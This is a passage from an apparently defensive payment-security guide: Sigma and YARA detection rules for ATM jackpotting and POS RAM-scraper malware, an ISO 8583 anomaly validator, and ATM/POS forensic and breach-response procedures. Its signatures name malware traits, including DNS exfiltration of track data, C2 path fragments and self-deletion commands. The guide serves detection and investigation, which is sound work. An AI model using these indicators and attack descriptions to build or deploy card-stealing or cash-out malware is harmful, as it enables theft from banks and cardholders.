            - '10.0.0.0/8'               # internal management
            - '172.16.0.0/12'             # internal management
            - '$PAYMENT_PROCESSOR_RANGE'  # processor IP range
    filter_dns:
        DestinationPort: 53
        DestinationIp|cidr: '$INTERNAL_DNS'
    condition: selection and not (filter_authorized or filter_dns)
level: high
tags:
    - attack.exfiltration
    - attack.t1041
    - pos.scraper
```

### 7.4 Sigma rules: suspicious ATM software update and network anomalies

**Unauthorized ATM software deployment.** Legitimate ATM software updates follow a controlled process — updates are pushed from the ATM management platform (e.g., NCR APTRA Activate, Diebold ProCash/ProBase management) during scheduled maintenance windows. Malware deployment via USB, network file copy, or remote desktop outside these windows is anomalous.

```yaml
title: ATM Software Installation Outside Maintenance Window
id: 3a7b8c9d-0e1f-2a3b-4c5d-6e7f8a9b0c1d
status: experimental
description: >
    Detects software installation or executable creation on an ATM outside
    the defined maintenance window. ATM malware (Ploutus, Tyupkin, WinPot)
    is typically deployed via USB or network copy during off-hours.
date: 2025-03-10
logsource:
    category: file_event
    product: windows
detection:
    selection_exe:
        TargetFilename|endswith:
            - '.exe'
            - '.dll'
            - '.bat'
            - '.ps1'
            - '.vbs'
        TargetFilename|contains:
            - '\Users\'
            - '\Temp\'
            - '\ProgramData\'
            - '\AppData\'
    filter_maintenance:
        # Maintenance window: Sunday 02:00-06:00 (configure per institution)
        timestamp|re: 'Sun.*(0[2-5]):'
    filter_known_updater:
        Image|endswith:
            - '\NCR\APTRA\Activate\*.exe'
            - '\Diebold\ProBase\*.exe'
    condition: selection_exe and not (filter_maintenance or filter_known_updater)
level: high
tags:
    - attack.persistence
    - attack.t1543
    - atm.deployment
```

**Unexpected outbound connections from ATM fleet.** ATMs should communicate only with their designated host/switch and the management platform. Outbound connections to the internet, unusual ports, or unexpected destinations indicate compromise (C2 communication, exfiltration, or malware updating).

```yaml
title: ATM Unexpected Outbound Network Connection
id: 4b8c9d0e-1f2a-3b4c-5d6e-7f8a9b0c1d2e
status: experimental
description: >
    Detects outbound network connections from ATM endpoints to destinations
    outside the authorized host, switch, and management platform ranges.
    ATM malware uses C2 channels for PAN list updates, status reporting,
    and remote activation commands.
date: 2025-03-10
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        Initiated: 'true'
    filter_authorized:
        DestinationIp|cidr:
            - '$ATM_HOST_RANGE'           # payment switch/host
            - '$MANAGEMENT_RANGE'         # APTRA Activate, ProBase
            - '$NTP_SERVERS'              # time sync
    condition: selection and not filter_authorized
level: critical
tags:
    - attack.command_and_control
    - attack.t1071
    - atm.c2
```

### 7.5 Sigma rule: jackpotting tool indicators and black-box device connection

**USB device insertion on ATM.** ATM endpoints should have a stable USB device profile — card reader, EPP, touchscreen. Any new USB device insertion (keyboard, storage device, Raspberry Pi, mobile phone) is suspicious. Sysmon PnP device events capture this.

```yaml
title: Unauthorized USB Device Connected to ATM
id: 5c9d0e1f-2a3b-4c5d-6e7f-8a9b0c1d2e3f
status: experimental
description: >
    Detects USB device insertion events on ATM endpoints. ATMs have a fixed
    USB peripheral profile; new device connections indicate physical tampering,
    black-box attachment, or malware deployment via USB storage.
date: 2025-03-10
logsource:
    product: windows
    service: driver-framework
detection:
    selection:
        EventID:
            - 2003   # PnP driver loaded
            - 2004   # Device installation
    filter_known_devices:
        DeviceInstanceID|contains:
            - '$EPP_DEVICE_ID'           # Encrypting PIN Pad
            - '$CARD_READER_DEVICE_ID'   # Card reader
            - '$TOUCHSCREEN_DEVICE_ID'   # Touchscreen
            - '$PRINTER_DEVICE_ID'       # Receipt printer
    condition: selection and not filter_known_devices
level: critical
tags:
    - attack.initial_access
    - attack.t1200
    - atm.physical_tamper
```

**ATM dispenser heartbeat loss.** When a black-box device is connected to the dispenser (§2.4), the PC loses communication with the dispenser. The XFS manager generates an error event when the heartbeat polling fails. A sustained heartbeat loss — especially combined with no associated ATM application error recovery — indicates cable disconnection for black-box attachment.

```yaml
title: ATM Dispenser Communication Loss (Black-Box Indicator)
id: 6d0e1f2a-3b4c-5d6e-7f8a-9b0c1d2e3f4a
status: experimental
description: >
    Detects loss of communication with the ATM cash dispenser, which occurs
    when the dispenser cable is disconnected from the PC for black-box
    attack attachment. Correlate with physical tamper switch events.
date: 2025-03-10
logsource:
    product: windows
    service: application
detection:
    selection:
        EventID: 1000
        Message|contains:
            - 'WFS_ERR_HARDWARE_ERROR'
            - 'WFS_ERR_CONNECTION_LOST'
            - 'CurrencyDispenser'
    filter_maintenance:
        timestamp|re: 'Sun.*(0[2-5]):'
    condition: selection and not filter_maintenance
level: critical
tags:
    - attack.initial_access
    - attack.t1200
    - atm.blackbox
```

### 7.6 YARA rules: ATM malware families

The YARA rules in §2 cover Ploutus.D (§2.1) and generic XFS-calling binaries (§2.6). The rules below target additional malware families with distinct static signatures.

```yara
rule RIPPER_ATM_Malware {
    meta:
        description = "Detects RIPPER ATM malware targeting Thai bank ATMs (2016)"
        author      = "Payment Security Research"
        date        = "2025-03-10"
        reference   = "FireEye RIPPER analysis, TH-CERT advisory"
        hash        = "7e0a8520c81c"
    strings:
        $xfs1       = "WFSOpen" ascii wide
        $xfs2       = "WFSExecute" ascii wide
        $xfs3       = "WFS_CMD_CDM_DISPENSE" ascii wide
        $dll        = "msxfs.dll" ascii wide nocase
        $ripper_s1  = "ATMRIPPER" ascii wide nocase
        $ripper_s2  = "\\Temp\\rii.log" ascii wide
        $ripper_s3  = "\\rip.dll" ascii wide
        $card_check = { 48 89 5C 24 ?? 48 89 6C 24 ?? 56 57 41 56 }
        // RIPPER checks for a specific EMV card before activating
        $emv_pan    = { 3B 67 00 00 }  // ATR prefix of trigger card
    condition:
        uint16(0) == 0x5A4D and
        filesize < 3MB and
        $dll and
        2 of ($xfs1, $xfs2, $xfs3) and
        (1 of ($ripper_s1, $ripper_s2, $ripper_s3) or ($card_check and $emv_pan))
}

rule GreenDispenser_ATM_Malware {
    meta:
        description = "Detects GreenDispenser ATM malware with self-delete capability"
        author      = "Payment Security Research"
        date        = "2025-03-10"
        reference   = "Proofpoint GreenDispenser analysis (2015)"
    strings:
        $xfs_open     = "WFSOpen" ascii wide
        $xfs_exec     = "WFSExecute" ascii wide
        $xfs_dispense = "WFS_CMD_CDM_DISPENSE" ascii wide
        $msxfs        = "msxfs.dll" ascii wide nocase
        // GreenDispenser uses sdelete or custom wiper for self-cleanup
        $sdelete      = "sdelete" ascii wide nocase
        $self_del     = "cmd /c del" ascii wide
        $green_s1     = "GreenDispenser" ascii wide nocase
        $green_s2     = "INTELL" ascii wide
        // QR-code-based activation: malware displays a QR on ATM screen
        $qr_lib       = "qrcode" ascii wide nocase
        $qr_gen       = "QRCodeGenerator" ascii wide
    condition:
        uint16(0) == 0x5A4D and
        filesize < 5MB and
        $msxfs and
        2 of ($xfs_open, $xfs_exec, $xfs_dispense) and
        (1 of ($sdelete, $self_del) or 1 of ($green_s1, $green_s2) or 1 of ($qr_lib, $qr_gen))
}

rule WinPot_ATM_Malware {
    meta:
        description = "Detects WinPot ATM malware with slot-machine-themed GUI"
        author      = "Payment Security Research"
        date        = "2025-03-10"
        reference   = "Kaspersky WinPot analysis (2019)"
    strings:
        $xfs_open     = "WFSOpen" ascii wide
        $xfs_exec     = "WFSExecute" ascii wide
        $xfs_dispense = "WFS_CMD_CDM_DISPENSE" ascii wide
        $msxfs        = "msxfs.dll" ascii wide nocase
        // WinPot displays a GUI with slot-machine reels showing cassette contents
        $winpot_s1    = "SPIN" ascii wide
        $winpot_s2    = "STOP" ascii wide
        $winpot_s3    = "SCAN" ascii wide
        $winpot_s4    = "cassette" ascii wide nocase
        $gui_class    = "WinPotWndClass" ascii wide
        $slot_reel    = { 53 4C 4F 54 }  // "SLOT"
    condition:
        uint16(0) == 0x5A4D and
        filesize < 4MB and
        $msxfs and
        2 of ($xfs_open, $xfs_exec, $xfs_dispense) and
        (3 of ($winpot_s1, $winpot_s2, $winpot_s3, $winpot_s4) or $gui_class or $slot_reel)
}
```

### 7.7 YARA rules: POS scraper families

```yara
rule FrameworkPOS_Scraper {
    meta:
        description = "Detects FrameworkPOS RAM scraper (DNS exfiltration variant)"
        author      = "Payment Security Research"
        date        = "2025-03-10"
        reference   = "G DATA FrameworkPOS analysis (2014)"
    strings:
        $track2_regex = ";%[0-9]{13,19}=" ascii
        $dns_exfil    = "nslookup" ascii wide
        $dns_query    = "DnsQuery" ascii wide
        // FrameworkPOS encodes track data in DNS subdomain labels
        $subdomain    = ".ns." ascii
        $base32       = { 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 }
        $framework_s1 = "fwk" ascii wide nocase
        $readmem      = "ReadProcessMemory" ascii wide
        $openproc     = "OpenProcess" ascii wide
        $luhn_check   = { 0F B6 ?? 83 ?? 30 }  // digit extraction for Luhn
    condition:
        uint16(0) == 0x5A4D and
        filesize < 2MB and
        $readmem and $openproc and
        (1 of ($dns_exfil, $dns_query) and $subdomain) and
        ($track2_regex or $luhn_check)
}

rule Backoff_POS_Malware {
    meta:
        description = "Detects Backoff POS RAM scraper (US-CERT Alert TA14-212A)"
        author      = "Payment Security Research"
        date        = "2025-03-10"
        reference   = "US-CERT TA14-212A, Secret Service advisory (2014)"
        severity    = "critical"
    strings:
        $readmem     = "ReadProcessMemory" ascii wide
        $openproc    = "OpenProcess" ascii wide
        $vquery      = "VirtualQueryEx" ascii wide
        // Backoff persistence: injects into explorer.exe
        $explorer    = "explorer.exe" ascii wide nocase
        $inject      = "WriteProcessMemory" ascii wide
        $backoff_s1  = "backoff" ascii wide nocase
        $backoff_s2  = "JAVEUPD" ascii wide      // known Backoff mutex
        $backoff_s3  = "ntstats" ascii wide       // C2 path component
        // Track data patterns
        $track1      = "%B" ascii
        $track2_sep  = "=0" ascii
        $http_post   = "POST" ascii
    condition:
        uint16(0) == 0x5A4D and
        filesize < 3MB and
        $readmem and $openproc and $vquery and
        ($inject or $explorer) and
        (1 of ($backoff_s1, $backoff_s2, $backoff_s3) or (1 of ($track1, $track2_sep) and $http_post))
}

rule PoSeidon_POS_Malware {
    meta:
        description = "Detects PoSeidon POS malware with keylogger and memory scraper"
        author      = "Payment Security Research"
        date        = "2025-03-10"
        reference   = "Cisco Talos PoSeidon analysis (2015)"
    strings:
        $readmem     = "ReadProcessMemory" ascii wide
        $openproc    = "OpenProcess" ascii wide
        $keylog      = "GetAsyncKeyState" ascii wide
        $poseidon_s1 = "FindStr" ascii wide
        $poseidon_s2 = "LOCKER" ascii wide
        $poseidon_s3 = "wnhel" ascii wide          // known C2 domain fragment
        $c2_path     = "/vre4g3t" ascii             // known URI path
        $track_scan  = { 25 42 ?? ?? ?? ?? ?? 5E }  // Track 1 header search
        $mutex       = "jnk" ascii wide
    condition:
        uint16(0) == 0x5A4D and
        filesize < 2MB and
        $readmem and $openproc and
        ($keylog or 2 of ($poseidon_s1, $poseidon_s2, $poseidon_s3, $c2_path, $mutex) or $track_scan)
}
```

### 7.8 Network-level detection: payment switch anomaly detection

Beyond the Suricata rule for FASTCash response latency (§2.3), payment switch traffic carries additional detectable anomalies.

**ISO 8583 field validation rules.** The payment switch can validate structural consistency of ISO 8583 messages to detect manipulation or injection. Implement these as inline checks in the switch or as a network-monitoring appliance inspecting mirrored traffic.

Field consistency checks:

- **MTI/Processing-Code mismatch.** MTI `0100` (authorization request) with Processing Code `31xxxx` (balance inquiry) should not carry DE4 (Amount) > 0. Injected messages often set inconsistent field combinations.
- **DE22 (POS Entry Mode) vs DE55 (EMV Data).** If DE22 indicates chip-read (051) but DE55 is absent, the message may be fabricated. Conversely, DE22 indicating mag-stripe (901) with DE55 present is anomalous.
- **DE35 (Track 2) Luhn validation.** Extract the PAN from DE35 and verify Luhn. Injected or corrupted PANs fail Luhn.
- **DE41 (Terminal ID) validation.** Verify DE41 matches a known terminal in the institution's terminal management system. Fabricated messages from a compromised switch may use non-existent terminal IDs.
- **DE43 (Card Acceptor Name/Location).** Validate against the merchant master database. FASTCash messages echo the request's DE43 but may contain stale or mismatched merchant data.
- **Response time anomaly.** Authorization responses (MTI `0110`) arriving in < 10ms from the switch indicate local generation (FASTCash). Normal round-trip to core banking: 200–2000ms.

```python
"""
ISO 8583 field consistency validator — deployed as a monitoring module
on mirrored switch traffic.  Flags structurally anomalous messages
for security review.
"""
import re
from dataclasses import dataclass
from typing import Optional

@dataclass(frozen=True)
class ISO8583Alert:
    rule_id: str
    severity: str     # critical | high | medium
    terminal_id: str
    pan_masked: str   # first 6 + last 4
    description: str
    raw_mti: str

def luhn_check(pan: str) -> bool:
    """Standard Luhn/mod-10 validation."""
    digits = [int(d) for d in pan if d.isdigit()]
    if len(digits) < 13:
        return False
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0

def validate_message(msg: dict) -> list[ISO8583Alert]:
    """Validate an ISO 8583 message for structural anomalies.
    `msg` is a dict with keys: mti, de2 (PAN), de3 (proc code), de4 (amount),
    de22 (pos entry mode), de35 (track2), de41 (terminal_id), de55 (emv_data),
    response_time_ms."""
    alerts: list[ISO8583Alert] = []
    pan = msg.get("de2", "")
    masked = f"{pan[:6]}******{pan[-4:]}" if len(pan) >= 10 else "UNKNOWN"
    tid = msg.get("de41", "UNKNOWN")

    # Rule 1: Luhn failure on PAN
    if pan and not luhn_check(pan):
        alerts.append(ISO8583Alert(
            rule_id="ISO-VAL-001", severity="high",
            terminal_id=tid, pan_masked=masked,
            description="PAN fails Luhn check — possible injection or corruption",
            raw_mti=msg.get("mti", ""),
        ))

    # Rule 2: POS Entry Mode vs EMV Data consistency
    pos_entry = msg.get("de22", "")
    emv_data = msg.get("de55")
    if pos_entry.startswith("05") and not emv_data:
        alerts.append(ISO8583Alert(
            rule_id="ISO-VAL-002", severity="high",
            terminal_id=tid, pan_masked=masked,
            description="DE22 indicates chip-read (05x) but DE55 (EMV data) absent",
            raw_mti=msg.get("mti", ""),
        ))
    if pos_entry.startswith("90") and emv_data:
        alerts.append(ISO8583Alert(
            rule_id="ISO-VAL-003", severity="medium",
            terminal_id=tid, pan_masked=masked,
            description="DE22 indicates mag-stripe (90x) but DE55 (EMV data) present",
            raw_mti=msg.get("mti", ""),
        ))

    # Rule 3: Response time anomaly (FASTCash indicator)
    resp_time = msg.get("response_time_ms")
    if resp_time is not None and msg.get("mti") == "0110" and resp_time < 10:
        alerts.append(ISO8583Alert(
            rule_id="ISO-VAL-004", severity="critical",
            terminal_id=tid, pan_masked=masked,
            description=(
                f"Authorization response in {resp_time}ms — "
                "local generation suspected (FASTCash pattern)"
            ),
            raw_mti="0110",
        ))

    # Rule 4: Amount sanity for balance inquiry
    proc_code = msg.get("de3", "")
    amount = int(msg.get("de4", "0") or "0")
    if proc_code.startswith("31") and amount > 0:
        alerts.append(ISO8583Alert(
            rule_id="ISO-VAL-005", severity="high",
            terminal_id=tid, pan_masked=masked,
            description="Balance inquiry (proc code 31xxxx) carries non-zero amount",
            raw_mti=msg.get("mti", ""),
        ))

    return alerts
```

### 7.9 Physical tamper detection integration with SIEM

Modern ATMs include physical tamper sensors: door switches (top hat, safe), cable-disconnect sensors, card-reader anti-tamper, EPP tamper mesh, and seismic/vibration sensors. These generate events through the ATM's SIU (Sensors and Indicators Unit) XFS service provider. Forwarding SIU events to the SIEM enables correlation with logical events.

**SIU event types and SIEM mapping:**

| SIU Event | XFS Event | Threat Indicator | SIEM Severity |
|-----------|-----------|-------------------|---------------|
| Top-hat door opened | `WFS_SRVE_SIU_PORT1` | Physical access — potential malware install or black-box | Critical |
| Safe door opened | `WFS_SRVE_SIU_SAFE_DOOR` | Cash access outside CIT schedule | Critical |
| Card reader tamper | `WFS_SRVE_SIU_PORT2` | Skimmer/shimmer installation | High |
| EPP tamper | `WFS_SRVE_SIU_PORT3` | PIN pad compromise attempt | Critical |
| Vibration/seismic | `WFS_SRVE_SIU_SEISMIC` | Ram-raid or explosive attack | Critical |
| Cable disconnect | `WFS_SRVE_SIU_PORT4` | Black-box cable substitution | Critical |

**Correlation rules.** Combine physical and logical events for high-confidence detection:

- Top-hat door open + new USB device within 5 minutes → black-box or malware deployment
- Top-hat door open + new executable written to disk within 10 minutes → malware installation
- Cable disconnect event + dispenser heartbeat loss → black-box attack in progress
- Card reader tamper + customer complaints about card retention → skimmer installed
- Multiple ATMs in same geographic area with door-open events in same time window → coordinated physical attack

```yaml
title: ATM Physical Tamper Followed by Logical Anomaly
id: 7e1f2a3b-4c5d-6e7f-8a9b-0c1d2e3f4a5b
status: experimental
description: >
    Correlates ATM physical tamper detection (SIU events) with subsequent
    logical indicators — USB device connection, executable creation, or
    dispenser communication loss. High-confidence indicator of physical
    ATM compromise in progress.
date: 2025-03-10
logsource:
    product: windows
    service: application
detection:
    selection_physical:
        Message|contains:
            - 'WFS_SRVE_SIU_PORT1'     # top-hat door
            - 'WFS_SRVE_SIU_PORT4'     # cable disconnect
            - 'WFS_SRVE_SIU_SAFE_DOOR'
    selection_logical:
        EventID:
            - 2003   # PnP device connected
            - 11     # Sysmon FileCreate
            - 1000   # XFS error
    timeframe: 10m
    condition: selection_physical | near selection_logical
level: critical
tags:
    - attack.initial_access
    - attack.t1200
    - atm.physical_tamper
```

---

## 8. ATM/POS forensics and incident response

### 8.1 ATM forensic acquisition

ATM forensic acquisition differs from standard Windows forensics in several key ways: the ATM application generates its own transaction journals (independent of Windows Event Logs), the XFS middleware produces detailed peripheral interaction logs, and the EPP (Encrypting PIN Pad) maintains its own key log and tamper history.

**XFS journal extraction.** The ATM application writes a continuous journal file recording every XFS command and response. Location varies by vendor:

- NCR APTRA: `C:\NCR\APTRA\Journals\` — files named by date (`JRNL_YYYYMMDD.log`)
- Diebold ProCash: `C:\Agilis\logs\xfsjournal\` — files named `xfs_YYYYMMDD_HHMMSS.log`
- Hyosung MoniMax: `C:\MoniMax\Journal\` — files named `MX_JRNL_YYYYMMDD.log`

Each journal entry contains: timestamp (local ATM time), XFS command or event name, service provider, parameters (cassette ID, note count for dispense operations; track data hash for card-read operations), and result code. Forensic acquisition must preserve the entire journal directory with original timestamps.

```bash
# ATM journal acquisition — forensic-grade with hash verification
# Run from forensic workstation connected to ATM via write-blocker or network share

# 1. Create evidence container
EVIDENCE_DIR="/evidence/ATM_$(hostname)_$(date -u +%Y%m%dT%H%M%SZ)"
mkdir -p "$EVIDENCE_DIR/journals"
mkdir -p "$EVIDENCE_DIR/hashes"

# 2. NCR APTRA journal acquisition
robocopy "C:\NCR\APTRA\Journals" "$EVIDENCE_DIR/journals/aptra" /E /COPYALL /LOG:"$EVIDENCE_DIR/journals/copy.log"

# 3. Generate SHA-256 hashes for chain of custody
find "$EVIDENCE_DIR/journals" -type f -exec sha256sum {} \; > "$EVIDENCE_DIR/hashes/journals_sha256.txt"

# 4. Capture XFS registry configuration
reg export "HKLM\SOFTWARE\XFS" "$EVIDENCE_DIR/xfs_registry.reg" /y
reg export "HKLM\SYSTEM\CurrentControlSet\Services" "$EVIDENCE_DIR/services_registry.reg" /y

# 5. Capture running processes and loaded DLLs
tasklist /V /FO CSV > "$EVIDENCE_DIR/processes.csv"
wmic process get Name,ExecutablePath,CommandLine /FORMAT:CSV > "$EVIDENCE_DIR/process_detail.csv"

# 6. Capture Sysmon event log if deployed
wevtutil epl "Microsoft-Windows-Sysmon/Operational" "$EVIDENCE_DIR/sysmon.evtx"

# 7. Generate acquisition manifest
sha256sum "$EVIDENCE_DIR"/*.reg "$EVIDENCE_DIR"/*.csv "$EVIDENCE_DIR"/*.evtx >> "$EVIDENCE_DIR/hashes/manifest_sha256.txt"
```

**EPP key log analysis.** The Encrypting PIN Pad maintains an internal audit log of cryptographic key operations: key loading events, key deletion events, tamper events (the EPP detected physical tampering and zeroized its keys), and authentication failures. This log is accessed via the XFS PIN service provider (`WFS_INF_PIN_KEY_DETAIL`) and is critical for determining whether an attacker accessed or manipulated encryption keys. On NCR EPPs, the key log is also available via the EPP's diagnostic interface (a serial connection using the EPP's diagnostic port, separate from the operational port). In a forensic context, the key log can reveal: the last time the master key (TMK — Terminal Master Key) was loaded, whether any unauthorized key-loading occurred, and whether the EPP's tamper mechanism was triggered (which zeroizes all keys — an attacker who tampered with the EPP would cause this event).

**NDC/DDC transaction log parsing.** ATMs running NCR's NDC (NCR Direct Connect) or Diebold's DDC (Diebold Direct Connect) protocols maintain a transaction log at the host level. Each transaction record contains: the terminal ID, timestamp, transaction type (withdrawal, balance inquiry, transfer), the card's PAN (masked in the log — typically first 6 and last 4 digits), the requested amount, the host response code, and the dispense result (number of notes dispensed from each cassette).

Parsing NDC transaction logs for anomalies:

```python
"""
NDC transaction log parser for forensic analysis.
Identifies anomalous dispense patterns indicative of jackpotting or cash-out attacks.
"""
import csv
import re
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path

@dataclass(frozen=True)
class NDCTransaction:
    timestamp: datetime
    terminal_id: str
    pan_masked: str
    amount: int            # in minor units (cents)
    response_code: str     # '00' = approved
    notes_dispensed: int
    cassette_breakdown: tuple[int, ...]  # notes per cassette

@dataclass
class AnomalyReport:
    terminal_id: str
    anomaly_type: str
    severity: str
    description: str
    transactions: list[NDCTransaction] = field(default_factory=list)

def parse_ndc_log(log_path: Path) -> list[NDCTransaction]:
    """Parse NCR NDC transaction log into structured records."""
    transactions: list[NDCTransaction] = []
    with open(log_path, "r", encoding="utf-8") as f:
        for line in f:
            # NDC log format: YYYYMMDD HHMMSS|TERM_ID|PAN_MASKED|AMT|RESP|NOTES|C1:C2:C3:C4
            match = re.match(
                r"(\d{8} \d{6})\|(\w+)\|(\d{6}\*+\d{4})\|(\d+)\|(\w{2})\|(\d+)\|([\d:]+)",
                line.strip(),
            )
            if match:
                ts = datetime.strptime(match.group(1), "%Y%m%d %H%M%S")
                cassettes = tuple(int(c) for c in match.group(7).split(":"))
                transactions.append(NDCTransaction(
                    timestamp=ts,
                    terminal_id=match.group(2),
                    pan_masked=match.group(3),
                    amount=int(match.group(4)),
                    response_code=match.group(5),
                    notes_dispensed=int(match.group(6)),
                    cassette_breakdown=cassettes,
                ))
    return transactions

def detect_anomalies(
    transactions: list[NDCTransaction],
    rapid_threshold: int = 15,       # max withdrawals per 30 min
    max_amount_threshold: int = 50000,  # per-txn max in minor units
) -> list[AnomalyReport]:
    """Analyze parsed transactions for cash-out indicators."""
    anomalies: list[AnomalyReport] = []
    by_terminal: dict[str, list[NDCTransaction]] = defaultdict(list)
    for txn in transactions:
        by_terminal[txn.terminal_id].append(txn)

    for tid, txns in by_terminal.items():
        txns_sorted = sorted(txns, key=lambda t: t.timestamp)

        # Sliding-window rapid withdrawal detection
        window = timedelta(minutes=30)
        for i, txn in enumerate(txns_sorted):
            window_txns = [
                t for t in txns_sorted[i:]
                if t.timestamp - txn.timestamp <= window
            ]
            if len(window_txns) >= rapid_threshold:
                anomalies.append(AnomalyReport(
                    terminal_id=tid,
                    anomaly_type="RAPID_WITHDRAWAL",
                    severity="critical",
                    description=(
                        f"{len(window_txns)} withdrawals in 30-min window "
                        f"starting {txn.timestamp.isoformat()}"
                    ),
                    transactions=window_txns,
                ))
                break  # one alert per terminal

        # Max-amount repeated withdrawals
        max_amt_txns = [t for t in txns_sorted if t.amount >= max_amount_threshold]
        if len(max_amt_txns) >= 5:
            anomalies.append(AnomalyReport(
                terminal_id=tid,
                anomaly_type="REPEATED_MAX_AMOUNT",
                severity="high",
                description=f"{len(max_amt_txns)} transactions at/above max amount threshold",
                transactions=max_amt_txns,
            ))

        # Single-cassette depletion (jackpotting empties one cassette)
        for txn in txns_sorted:
            if txn.cassette_breakdown:
                nonzero = [c for c in txn.cassette_breakdown if c > 0]
                if len(nonzero) == 1 and txn.notes_dispensed > 20:
                    anomalies.append(AnomalyReport(
                        terminal_id=tid,
                        anomaly_type="SINGLE_CASSETTE_DRAIN",
                        severity="high",
                        description=(
                            f"Single-cassette dispense of {txn.notes_dispensed} notes "
                            f"at {txn.timestamp.isoformat()}"
                        ),
                        transactions=[txn],
                    ))

    return anomalies
```

### 8.2 POS forensic methodology

**Memory acquisition for track data recovery.** When a POS system is suspected of RAM scraper compromise, volatile memory acquisition is the highest priority — track data may still reside in process memory. Use a forensic memory acquisition tool (e.g., WinPmem, Magnet RAM Capture, or Belkasoft Live RAM Capturer) to capture a full physical memory image before any other forensic action. After acquisition, scan the memory image for Track 1 and Track 2 patterns:

```bash
# Volatility 3 workflow for POS memory forensic analysis

# 1. Identify running processes — look for suspicious non-POS processes
vol3 -f pos_memory.raw windows.pslist

# 2. Scan for Track 2 data patterns in all process memory
vol3 -f pos_memory.raw windows.vadyarascan --yara-rules "rule track2 { strings: \$t2 = /;[0-9]{13,19}=[0-9]{4}/ condition: \$t2 }"

# 3. Dump suspicious process memory for detailed analysis
vol3 -f pos_memory.raw windows.memmap --pid <SUSPICIOUS_PID> --dump

# 4. Scan for known POS malware signatures
vol3 -f pos_memory.raw windows.vadyarascan --yara-file pos_malware_rules.yar

# 5. Extract DLL list for suspicious processes — RAM scrapers inject into legitimate processes
vol3 -f pos_memory.raw windows.dlllist --pid <SUSPICIOUS_PID>

# 6. Check for process hollowing (common POS malware technique)
vol3 -f pos_memory.raw windows.malfind --pid <SUSPICIOUS_PID>
```

**PCI DSS evidence requirements.** A POS breach investigation must produce evidence meeting PCI DSS Incident Response requirements (PCI DSS v4.0 Requirement 12.10):

- Complete timeline of compromise (initial access → lateral movement → scraper deployment → exfiltration start → exfiltration end)
- List of all compromised PANs (for card-brand notification)
- Network topology showing the attacker's path from entry point to POS terminals
- Malware samples with hashes (SHA-256) for the compromised environment
- Confirmation of whether P2PE was in place (if yes, track data should not have been in cleartext memory)
- Evidence of PCI DSS control effectiveness or failure at each stage

### 8.3 Network forensics: ISO 8583 transaction replay analysis

When investigating a suspected FASTCash attack or payment-switch compromise, network forensics focuses on reconstructing the ISO 8583 message flow between the ATM fleet and the switch.

**Packet capture analysis.** If network TAPs or SPAN ports are in place on the switch segment, PCAP files contain the raw ISO 8583 messages. The messages are typically carried over raw TCP (no HTTP encapsulation) on port 8583, 9100, or a custom port. Parsing requires knowledge of the institution's ISO 8583 specification (field lengths, encoding — EBCDIC or ASCII, bitmap format).

**Transaction replay for anomaly detection.** Replay captured ISO 8583 traffic through the field-validation engine (§7.8) to retroactively identify manipulated messages. Focus on:

- Authorization responses (MTI `0110`) with response times < 10ms (locally generated on compromised switch)
- PANs that appear in approved authorizations but have no corresponding record in the core banking system
- Terminal IDs that appear in transactions but were offline during the transaction window (the switch fabricated the terminal context)
- Authorization codes (DE38) that do not appear in the issuer's authorization log

### 8.4 Physical evidence: skimmer and shimmer forensics

**Skimmer identification and documentation.** When a skimmer is discovered on an ATM:

1. **Do not remove immediately.** Photograph the skimmer in situ from multiple angles. Measure dimensions. Note attachment method (adhesive, clips, magnetic mount).
2. **Document the Bluetooth/wireless capability.** Many modern skimmers include a BLE (Bluetooth Low Energy) module for wireless data retrieval. Scan the area with a BLE scanner (e.g., `nRF Connect` mobile app) for devices broadcasting near the ATM — the skimmer's BLE module often uses a default device name or a recognizable UUID pattern.
3. **Remove with gloves.** Preserve fingerprints. Place in an anti-static evidence bag.
4. **Data extraction.** Connect the skimmer to a forensic workstation (via its USB port, serial interface, or by reading the flash chip directly). Extract the stored track data. Hash the extracted data file (SHA-256) for chain of custody.
5. **Firmware analysis.** If the skimmer contains a microcontroller (common: ATmega328, STM32, ESP32 for BLE-equipped skimmers), dump the firmware for analysis. The firmware reveals: the data storage format, any encryption of stored data, BLE pairing credentials, and potentially identifying information (compiler artifacts, debug strings).

**Shimmer detection.** Shimmers are extremely thin (0.1–0.2mm) and sit inside the card reader, making visual detection nearly impossible. Detection methods:

- **Resistance measurement.** Insert a test card and measure the contact resistance between the card's chip contacts and the reader's contacts. A shimmer introduces additional resistance (typically 1–5 ohms above baseline).
- **X-ray inspection.** Portable X-ray of the card reader reveals the shimmer's PCB outline.
- **Chip-contact signal analysis.** The shimmer introduces measurable signal delay and impedance changes on the ISO 7816 communication between the card and the reader. Advanced card readers can detect this anomaly automatically.

### 8.5 Chain of custody for payment card forensic evidence

PCI Forensic Investigator (PFI) requirements dictate strict chain-of-custody procedures for payment card breach evidence. PFI-qualified investigators (certified by the PCI SSC — Payment Card Industry Security Standards Council) must:

- Maintain a documented chain of custody for all digital evidence: acquisition timestamps (UTC ISO 8601), hash values at acquisition and at each transfer, identity of each custodian, storage location and security controls.
- Store evidence in encrypted containers (AES-256) on forensic workstations that are not connected to the compromised network.
- Retain evidence for the period required by card-brand rules (Visa: 3 years from the incident date; Mastercard: 5 years; American Express: 7 years) and applicable regulatory requirements.
- Produce a PFI report that meets the PCI SSC PFI Report Template requirements, including: executive summary, detailed timeline, evidence inventory, compromise scope (number of PANs, geographic scope), root cause analysis, and remediation validation.

### 8.6 IR playbook: payment card breach notification timeline

A payment card breach triggers a cascading set of notification obligations with specific deadlines:

| Milestone | Deadline | Responsible Party | Action |
|-----------|----------|-------------------|--------|
| Suspected breach | T+0 | Merchant/processor | Engage PFI, preserve evidence, contain active compromise |
| Card brand notification | T+24h | Acquirer | Notify Visa (via VROL), Mastercard (via SAFE), AMEX, Discover |
| PFI engagement | T+5 days | Merchant | PFI on-site investigation begins |
| Preliminary PFI report | T+10 days | PFI | Initial scope assessment, compromised PAN range estimate |
| Law enforcement notification | T+72h (GDPR) | Merchant | Notify relevant authorities (FBI/Secret Service for US; local CERT + DPA for EU) |
| Card reissuance trigger | T+5-10 days | Issuer | Issuers decide reissuance based on PFI preliminary; CAMS (Common Compromise alerts) distributed |
| Final PFI report | T+30-45 days | PFI | Complete root cause, full PAN list, remediation verification |
